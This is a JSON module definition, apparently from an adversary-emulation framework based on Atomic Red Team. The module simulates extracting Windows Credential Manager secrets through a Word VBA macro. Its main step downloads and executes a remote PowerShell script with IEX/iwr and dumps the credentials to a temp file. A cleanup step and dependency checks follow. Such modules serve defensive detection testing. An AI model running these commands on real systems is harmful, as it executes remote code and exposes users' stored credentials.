{
  "id": "234f9b7c-b53d-4f32-897b-b880a6c9ea7b",
  "name": "Extract Windows Credential Manager via VBA",
  "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "337ec030-0744-4cdf-92e8-bcee37d003c9",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "3160f097-c44d-41a3-b238-b64cb8411639",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "bf415f9c-6df3-4553-ac0d-4ffe76dc69f5",
      "name": "Check dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "3aad1bdb-25ea-4d9c-a1a3-caf04e52c34e",
      "name": "Resolve dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "de2c52ec-8c30-4c8e-ac50-8db8b84925f7",
      "name": "Re-check dependency 1/1",
      "description": "Microsoft Word must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"word.Application\" | Out-Null\n  $process = \"winword\"\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
